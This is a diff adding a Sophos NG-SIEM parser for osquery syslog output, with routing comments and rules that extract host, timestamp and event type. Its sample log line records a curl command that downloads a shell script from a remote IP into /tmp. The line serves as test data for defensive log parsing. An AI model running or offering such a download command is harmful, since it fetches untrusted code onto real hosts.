@@ -1,0 +1,50 @@
+!SAMPLE=<158>Oct 15 01:10:41 db02.example.com osqueryd[1187]: {"name":"process_events","hostIdentifier":"db02.example.com","calendarTime":"Thu Oct 15 01:10:41 2026 UTC","unixTime":"1792026641","epoch":"0","counter":"40","numerics":false,"columns":{"auid":"1000","cmdline":"curl -s -o /tmp/x.sh http://198.51.100.9/x.sh","cwd":"/home/adoe","parent":"30090","path":"/usr/bin/curl","pid":"30121","time":"1792026640","uid":"1000"},"action":"added"}
+!CONFIRMWITH=PATTERN
+!CONFIRMSTRING="calendarTime"\s*:\s*"[A-Z][a-z]{2} [A-Z][a-z]{2} +\d{1,2} \d{2}:\d{2}:\d{2} \d{4}|osqueryd(?:\[\d+\])?:\s+severity=\d+ location=\S+ message=
+!SCHEMA=scwx.generic
+!TRIMALLOFF
+
+# Parser Studio 0.1.0: https://github.com/Aaronjacobs000/sophos-ngsiem-parser-studio
+# Emulator result, not run in Sophos NG-SIEM. Test with Parse Message and Run Test before you turn it on.
+# Source: osquery scheduled query results (event format, one JSON object per row change) and status
+# logs from osqueryd's syslog logger plugin, forwarded by the host's syslog daemon:
+#   <158>Oct 15 01:10:41 db02.example.com osqueryd[1187]: {"name":"process_events","hostIdentifier":...}
+# Results go to the system log at facility local3 by default, with an @cee: cookie when
+# --logger_syslog_prepend_cee is set; status logs are "severity=N location=file:line message=...".
+# Parent: query names and columns are set by whoever writes the query, so rows are routed by their
+# columns, not their names. Added rows with pid and cmdline (processes, process_events, and the
+# incident-response pack's logged_in_users) go to the Process child. Added rows with a remote
+# address and port (process_open_sockets, as in the incident-response pack's open_sockets, and
+# socket_events) go to the Netflow child. Removed rows, snapshots, batches, other queries and status
+# logs stay generic.
+# !TRIMALLOFF stops TRIM_ALL() stripping braces and brackets from JSON values.
+
+jsonMatch = originalData$|(\{.*\})\s*$
+json = JSON(IF jsonMatch[1] != "" THEN jsonMatch[1] ELSE "{}")
+
+# Variables and $ fields set here are visible to both children.
+sensorType$ = "osquery"
+hdr = originalData$|^(?:<\d{1,3}>)?(?P<t>[A-Z][a-z]{2} +\d{1,2} \d{2}:\d{2}:\d{2})\s+(?P<h>\S+)\s
+host = STRING(json["$.hostIdentifier"])
+host = IF host == "" THEN STRING(json["$.hostname"]) ELSE host
+host = IF host == "" THEN hdr["h"] ELSE host
+hostId$ = IF host != "" THEN host ELSE NULL
+
+# unixTime is when the query ran, in epoch seconds, as text or, from osquery 5.10, a number. Status
+# logs have only the syslog header's time, which has no year and no zone, read as UTC.
+ut = STRING(json["$.unixTime"])
+utOk = ut|^(?P<n>\d{9,11})$
+eventTimeUsec$ = IF utOk["n"] != "" THEN INT(utOk["n"], 10) * 1000000 ELSE eventTimeUsec$
+eventTimeUsec$ = IF utOk["n"] == "" AND hdr["t"] != "" THEN DATETIME(hdr["t"], "Jan _2 15:04:05", TRUE) ELSE eventTimeUsec$
+
+# Numbers come as text or as numbers (numerics), so each column is read through STRING().
+act = STRING(json["$.action"])
+pid = STRING(json["$.columns.pid"])
+cmd = STRING(json["$.columns.cmdline"])
+remote = STRING(json["$.columns.remote_address"])
+rport = STRING(json["$.columns.remote_port"])
+remoteOk = remote|^(?P<ip>[0-9A-Fa-f.:]*[0-9A-Fa-f][0-9A-Fa-f.:]*)$
+connected = remoteOk["ip"] != "" AND remote != "0.0.0.0" AND remote != "::" AND rport != "" AND rport != "0"
+eventType$ = "other"
+eventType$ = IF act == "added" AND pid != "" AND cmd != "" AND remote == "" THEN "process" ELSE eventType$
+eventType$ = IF act == "added" AND connected THEN "netflow" ELSE eventType$
